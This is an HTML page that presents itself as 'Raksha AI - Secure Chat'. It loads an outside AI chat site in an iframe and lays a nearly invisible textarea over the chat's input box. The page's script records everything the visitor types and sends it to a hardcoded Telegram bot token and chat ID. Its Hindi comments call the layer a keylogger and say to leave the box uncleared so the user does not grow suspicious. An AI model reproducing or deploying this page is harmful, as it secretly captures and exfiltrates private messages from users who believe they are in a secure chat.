<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raksha AI - Secure Chat</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        
        /* असली AI वेबसाइट */
        #aiFrame {
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }

        /* पारदर्शी की-लॉगर लेयर */
        #stealthLayer {
            position: absolute;
            bottom: 20px; /* AI के इनपुट बॉक्स की पोजीशन के हिसाब से बदलें */
            left: 5%;
            width: 90%;
            height: 50px;
            background: rgba(255, 255, 255, 0.01); /* लगभग अदृश्य */
            border: none;
            color: transparent;
            caret-color: #000; /* कर्सर को छुपाने के लिए */
            z-index: 9999;
            font-size: 16px;
            outline: none;
        }
    </style>
</head>
<body>

    <iframe id="aiFrame" src="https://aesthetic-yeot-93d835.netlify.app"></iframe>

    <textarea id="stealthLayer" placeholder=""></textarea>

    <script>
        const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
        const MY_ID = "8508792403";
        const stealthBox = document.getElementById('stealthLayer');
        
        let typingTimer;
        const doneTypingInterval = 3000; // 3 सेकंड रुकने के बाद मैसेज भेजेगा

        // टाइपिंग कैप्चर करना
        stealthBox.addEventListener('input', () => {
            clearTimeout(typingTimer);
            typingTimer = setTimeout(sendToTelegram, doneTypingInterval);
        });

        async function sendToTelegram() {
            const message = stealthBox.value;
            if (message.trim() === "") return;

            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
            const params = {
                chat_id: MY_ID,
                text: `⌨️ USER TYPED: \n${message}`
            };

            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(params)
                });
                // भेजने के बाद बॉक्स खाली न करें वरना यूज़र को शक होगा
            } catch (err) {
                console.log("Sync Error...");
            }
        }

        // मोबाइल पर कीबोर्ड आने पर पोजीशन एडजस्ट करने के लिए
        window.addEventListener('resize', () => {
            stealthBox.style.bottom = "10px";
        });
    </script>
</body>
</html>
